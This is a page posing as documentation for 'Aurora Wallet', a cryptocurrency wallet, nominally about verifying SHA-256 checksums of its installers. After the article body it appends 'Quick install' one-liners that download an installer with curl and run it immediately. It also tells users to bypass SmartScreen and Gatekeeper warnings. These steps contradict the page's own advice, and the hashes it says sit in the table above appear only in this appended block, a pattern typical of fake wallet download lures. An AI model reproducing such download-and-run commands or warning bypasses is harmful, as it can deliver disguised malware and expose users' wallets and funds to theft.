![Aurora Wallet verify sha256 checksums guide](assets/aurora-wallet-guide-article-banner.png)

# How to verify Aurora Wallet SHA-256 checksums

Compare your download with the published hash before you run it, on Windows, macOS or Linux.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A SHA-256 check takes one command and proves that the file you downloaded is the file the Foundation built.

Every release publishes a 64-character SHA-256 value for each installer. Your operating system can compute the same value from the file on your disk in a second. If the two strings match, character for character, the download is intact and unmodified.

<!-- ARTICLE-BODY-BEGIN -->

## Why the check matters

A download can fail silently. A dropped packet, a proxy that rewrites content or a mirror that serves an older file all produce a file that looks right and behaves wrongly. The hash comparison catches every one of those cases, because a single changed byte produces a completely different value.

The values always come from the release page of the wallet repository, never from a message, a comment or a third-party blog. A hash copied from anywhere else proves nothing.

## Run the command for your system

**Windows:** open PowerShell and run `certutil -hashfile aurora-wallet-v2026.08.1.0.exe SHA256`.

**macOS:** open Terminal and run `shasum -a 256 aurora-wallet-v2026.08.1.0.dmg`.

**Linux:** open a terminal and run `sha256sum aurora-wallet-v2026.08.1.0.zip`.

Compare the output with the table above. Case does not matter, characters do.

If the strings differ, delete the file and download it again before doing anything else. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/07-github-releases-guide.md">The GitHub releases guide</a> shows where the checksums sit on the release page, in case the layout is unfamiliar.

## What to do when the values differ

A mismatch has three common causes: an interrupted download, a cached copy served by a browser or proxy, and an old file compared against a new release. Clear the browser cache, try a different network if you can, and download from the release page again rather than from a saved link.

Never run a file because it is probably fine. The point of the check is that you do not have to guess, and the published value is the only reference that counts. The installers and their hashes are listed together on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>.

If a link sent you to a file that is not on that page, treat it as hostile, and read <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md">how to spot fake wallet downloads</a> before you try again.

## FAQ

### Can I skip the check if the file came from the release page?

You can, and you would be trusting the connection instead of the file. The check costs ten seconds and removes that trust from the equation.

### Why does the hash change with every release?

Because the installer changes. Each release is a new build with a new signature over new bytes, so the value is published per file, per version.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [GitHub releases guide](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/07-github-releases-guide.md)
- [Spot fake wallet downloads](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md)
- [Windows Defender and SmartScreen](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/18-windows-defender-smartscreen.md)
- [Release 2026.08.1.0 details](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/08-release-2026-08-1-0.md)
